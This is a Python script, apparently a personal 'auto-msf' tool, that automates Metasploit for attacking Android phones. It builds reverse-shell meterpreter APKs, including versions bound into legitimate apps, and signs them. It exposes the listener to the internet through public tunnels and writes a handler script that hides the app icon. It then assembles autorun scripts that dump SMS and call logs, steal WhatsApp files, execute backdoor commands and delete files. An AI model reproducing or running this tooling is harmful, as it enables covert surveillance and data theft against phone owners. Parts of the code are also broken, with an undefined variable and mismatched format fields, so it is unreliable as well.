#!/usr/bin/python3.9

import argparse
import json
import os
import sys
import colorama

red=colorama.Fore.RED
blue=colorama.Fore.BLUE
cyne=colorama.Fore.CYAN
ylo=colorama.Fore.YELLOW
reset=colorama.Fore.RESET


parser = argparse.ArgumentParser(description=red+"....SIMPLE SCRIPT TO AUTOMATE METASPLOIT-FRAMEWORK...."+reset,epilog=ylo+'''

                [~] ... ONLY ANDROID MODE SUPPORT ...[~] 
                '''+reset,usage=blue+''' 
                                python3 auto-msf.py -mm
                                python3 auto-msf.py -ml
                                [Default ip and port]
                                hospitable-country.auto.playit.gg : 57329 '''+reset)

parser.add_argument("-mm","--metasploit",action="store_true",help=blue+"run progrgam using mm string"+reset)
parser.add_argument("-ml","--msfconsole",action="store_true",help=blue+"run metasploit console using ml string"+reset)
parser.add_argument("-S","--server",action="store_true",help=blue+"start server.."+reset)
parser.add_argument("-AS","--autorun_script",action="store_true",help=blue+"making autorun script"+reset)

args = parser.parse_args()

mm=args.metasploit
ml=args.msfconsole
S=args.server
AS=args.autorun_script
    
def main():
    if mm :
        banner() 
        port_forwarding()
        pay_gen()
    if ml :
        launch()
    if S:
        import pyshorteners
        s = pyshorteners.Shortener()
        s.post.short('http://felt-figures-art-saints.trycloudflare.com')
    if AS:
        meterpreter_commands()
        
           
def banner():
    os.system('lolcat -p 4.0 -F 0123456776543210 -S 3  -s 70 -t -f banner.txt')
    print('''
    {0}(for android payload only )                      [*] Port Forwarding Options [*] 
        -------------------------------------                _-----------------_
    a) android/meterpreter/reverse_tcp  |                   | [1]Ngrok..        |
    b) android/meterpreter/reverse_http |                   | [2]localhost.run..|       
    c) android/meterpreter/reverse_https|                   | [3]playit service.|------|               
    d) android/meterpreter_reverse_tcp  |                   | [4]cloudflared .. |      |
    e) android/meterpreter_reverse_http |                   |_[5] Any other..  _|      |
    f) android/meterpreter_reverse_https|                   ----------------------------
    -------------------------------------                                   |___ {1}  {2}
            [127.0.0.1:4444]---->> hospitable-country.auto.playit.gg : 57329  <--|            
            [127.0.0.1:2345]---->>  used-protest.auto.playit.gg : 48552       <--| {3}

        '''.format(ylo,reset,cyne,reset))


    
    
def port_forwarding():
    p_f=input(blue+"[*] Select Port Forwarding Options...[1,2,3,4,5] OR Press Enter To Skip:~"+reset)
    
    if p_f == "1":
        x=input("Input service and port to bind with port forwarding service (ex. tcp 1234) :::")
        os.system('xterm -geometry 160x90 -e /home/kaulik/Mytools/trape/ngrok {} &'.format(x))
    elif p_f == "2":
        x=input("Input port to bind with localhost.run port forwarding service :::")
        os.system('xterm -geometry 160x90 -e ssh -R {}:localhost:{} localhost.run & '.format(x,x))
    elif p_f == "3":
        os.system('xterm -T " Port Forwarding " -geometry 160x90  -e /home/kaulik/Downloads/playit-linux_64-0.4.6 &')
    elif p_f == "4":
        x=input("Enter ip and port :::")
        os.system('xterm -T " Port Forwarding " -geometry 160x90 -e cloudflared --url {} &'.format(x))  
        
    elif p_f == "5":
        os.system('mate-terminal -e /bin/zsh') 
    else:
        print("Skiped")
    
    

def pay_gen():
    and_pay={
        "a":"android/meterpreter/reverse_tcp",
        "b":"android/meterpreter/reverse_http",
        "c":"android/meterpreter/reverse_https",
        "d":"android/meterpreter_reverse_tcp",
        "e":"android/meterpreter_reverse_http",
        "f":"android/meterpreter_reverse_https",
    
    }
    
# Selection..

    ipp=input(cyne+"[*]-------> Enter Ip:~      \n[==>]"+reset)
    prt=input(cyne+"[*]-------> Enter Port:~    \n[==>]"+reset)
    pay=input(cyne+"[*]-------> Enter Payload options (a/f):~   \n[==>]"+reset)
    app=input(cyne+"[*]-------> Enter Payload Name Without .apk:~       \n[==>]"+reset)
    bind=input(cyne+"[*]-------> Do You Bind Payload with apk[y/n]:~        \n[==>]"+reset)
    
    
    
    if bind == "y":
        print(blue,"[~] Ok ! Enter Original APK path:: ",reset)
        bind1=input("Path==>    \n[==>] ")
        print("path ==>  ",bind1)
        print(ylo,"[*] Look At Here : =>> msfvenom -a dalvik --platform android -x {0} -p {1} lhost={2} lport={3} R > {4}.apk".format(bind1,and_pay.get(pay),ipp,prt,app),reset)
        x=input(blue+"[~] Type y to Continue.. And n To Abort    \n[==>] "+reset)
        if x == "y":
            print(red,"[~] Making Payload ... Wait",reset)
            os.system('msfvenom -a dalvik --platform android SessionExpirationTimeout=9099000 AndroidWakelock=true -x {0} -p {1} lhost={2} lport={3} R > msf_{4}.apk'.format(bind1,and_pay.get(pay),ipp,prt,app)) 
            print(blue,"[*] payload ready now singing...",reset)
            #os.system('d2j-apk-sign msf_{}.apk -o msff_{}.apk;rm msf_{}.apk '.format(app,app,app))
            # os.system('keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000')
            
            os.system('''
                       
                        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore msf_{3}.apk hacked
                        jarsigner -verify -verbose -certs msf_{4}.apk
                        zipalign  -v 4 msf_{0}.apk {1}.apk
                        rm -rf msf_{2}.apk
                        
                        '''.format(app,app,app,app,app))
        else :
            print("[~*] You Press [n] {} Exited {} [*~]".format(red,reset))
            quit()
    else:
        
        print(blue,"[~] Ok ! generating standalone..",reset)
        print(ylo,"[*] Look At Here : =>> msfvenom -a dalvik --platform android  SessionExpirationTimeout=9099000  AndroidWakelock=true  -p {0} lhost={1} lport={2} R > {3}.apk".format(and_pay.get(pay),ipp,prt,app),reset) 
        x=input(blue+"[~] Type y to Continue.. And n To Abort :~    \n[==>] "+reset)
        if x == "y":
            print(red,"[~] Making Payload ... Wait",reset)
            os.system('msfvenom -a dalvik --platform android SessionExpirationTimeout=9099000  AndroidWakelock=true -p {0} lhost={1} lport={2} R > msf_{3}.apk'.format(and_pay.get(pay),ipp,prt,app)) 
            print(blue,"[*] standalone payload ready now singing...",reset)
            os.system('''
                    
                    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore msf_{3}.apk hacked
                    jarsigner -verify -verbose -certs msf_{4}.apk
                    zipalign  -v 4 msf_{0}.apk {1}.apk
                    rm -rf msf_{2}.apk
                    
                      '''.format(app,app,app,app,app))
            
        else:
            print("[~*] You Press [n] {} Exited {} [*~]".format(red,reset))
            quit()
            
    print(red,"[*]..Ready Now Making ruby script..[*]",reset)
    with open('{}.rb'.format(app),"w") as k:
        k.write("sudo msfdb start \n")
        k.write("use multi/handler \n")
        k.write("set payload {} \n".format(and_pay.get(pay)))
        k.write("set lhost {} \n".format(ipp))
        k.write("set lport {} \n".format(prt))
        k.write("set SessionExpirationTimeout 909000 \n")
        k.write("set AutoRunScript {} \n".format(r))
        k.write("set InitialAutoRunScript /home/kaulik/Desktop/AUTO-MSF/hide_icon \n")
        k.write("set ReverseListenerBindAddress 127.0.0.1 \n")
        k.write("set ReverseListenerBindPort 4444 \n")
        k.write("set ExitOnSession false \n") 
        k.write("exploit -j \n")
        k.close()
    
    print(cyne,"[~]Script Done [!]",reset)
    meterpreter_commands()
    print(blue),os.system(' echo "[~] Script Saved In ";pwd '),print(reset)
    print(cyne,"[~] Use msfconsole -q -r {}.rb To Launch And Payload is {}.apk::".format(app,app),reset)



def meterpreter_commands():
    
    print(blue,'''
                            [*.a] DUMPING SMS AND CALLLOGS..                     
                            [*.b] CHANGING WALLPAPERS..         
                            [*.c] UPLOADING FILES..   
                            [*.d] EXECUTING FILES..   
                            [*.e] EXECUTING BACKDOOR CMD..  
                            [*.f] ENCODING/DECODING WHATSAPP FILES..  
                            [*.g] DOWNLOADING WHATSAPP FILES..  
                            [*.h] SOME FUN..   
                            [*.i] DELETING FILES 
                            [*.j] ENTER ANY METERPRETER COMMAND..
                            [*.0] Quit 
        ''',reset)
    
    
    while True:
        try:
            x = str(input(red+"[*] Select Commands And Type Quit(0)    "+reset))
            if x != "0":
                with open('meterperter.json') as file:
                    y=json.load(file)
                    with open('auto','a') as f:
                        f.write("{} \n".format(y['meterpreter'][x]))
                        f.close()    
            else:
                r=input(red+"Enter autorun script name:"+reset)
                with open('auto','r') as file:
                    x=file.read()
                    with open('meterperter.json') as file:      
                        y=json.load(file)
                        for i in y['dumping']:os.system('echo "{0}" >> {1}'.format(i,r)) if "dumping" in x else None
                        for i in y['changing_wallpapers']:os.system('echo "{0}" >> {1}'.format(i,r)) if "changing_wallpapers" in x else None
                        for i in y['uploading_files']:os.system('echo "{0}" >> {1}'.format(i,r)) if "uploading_files" in x else None
                        for i in y['executing_files']:os.system('echo "{0}" >> {1}'.format(i,r)) if "executing_files" in x else None
                        for i in y['executing_backdoor_cmd']:os.system('echo "{0}" >> {1}'.format(i,r)) if "executing_backdoor_cmd" in x else None
                        for i in y['encoding/decoding_whatsapp_files']:os.system('echo "{0}" >> {1}'.format(i,r)) if "encoding/decoding_whatsapp_files" in x else None
                        for i in y['downloading_whatsapp_files']:os.system('echo "{0}" >> {1}'.format(i,r)) if "downloading_whatsapp_files" in x else None
                        for i in y['some_fun']:os.system('echo "{0}" >> {1}'.format(i,r)) if "some_fun" in x else None
                        for i in y['deleting_files']:os.system('echo "{0}" >> {1}'.format(i,r)) if "deleting_files" in x else None
                        for i in y['enter_any_meterpreter_command']:os.system('echo "{0}" >> {1}'.format(i,r)) if "enter_any_meterpreter_comman" in x else None
                    
                        os.remove('/home/kaulik/Desktop/AUTO-MSF/auto')
                        os.system('cat {}'.format(r))
                        
                        
                        
                    quit()    
        except KeyError:
            print(red,"[*] Not in database (a to j)",reset)
            continue
        except FileNotFoundError:
            print(red,"[*] File not found",reset)
            continue
            
        
        

def launch():
    os.system('lolcat -p 4.0 -F 0123456776543210 -S 3  -s 70 -t -f banner.txt')
    print(blue,''' 
                        [*]. Select Any One:- ///
                                ---------------------
                                | [1]Ngrok..        |
                                | [2]localhost.run..|
                                | [3]playit service.|
                                | [4]cloudflared .. |      
                                | [5]Any Other..    |
                                --------------------- 
          ''',reset)
    port_forwarding()
    print("metasploit-console starting") 
    os.system('msfconsole -q -r {}.rb'.format(ml))
    print("msfdb stoping")
    os.system('sudo msfdb stop')


try:
    main() 
except KeyboardInterrupt as KeyError :
    print(red,"[~]Exited[~]",reset)   
    quit()
    
else:
    os.system('lolcat -p 4.0 -F 0123456776543210 -S 3  -s 70 -t -f banner.txt')
    print(ylo,"Good Bye Kaulik",reset)

        




